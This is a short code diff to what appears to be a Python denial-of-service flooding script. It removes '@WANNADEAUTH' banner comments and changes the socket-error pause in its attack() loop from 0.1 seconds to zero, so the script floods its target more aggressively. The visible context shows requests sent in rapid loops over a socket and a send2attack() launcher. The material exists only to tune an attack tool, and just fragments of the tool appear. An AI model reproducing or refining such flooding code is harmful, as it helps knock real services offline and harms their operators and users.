@@ -1,6 +1,3 @@
-# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
-# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
-# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
 
 import socket
 import os, sys
@@ -67,7 +64,7 @@ def attack():
       for y in range(100):
           atk.send(str.encode(request))
     except socket.error:
-      time.sleep(.1)
+      time.sleep(0)
     except:
       pass
 
@@ -80,6 +77,3 @@ def send2attack():
 
 send2attack() 
 
-# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
-# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
-# @WANNADEAUTH @WANNADEAUTH @WANNADEAUTH
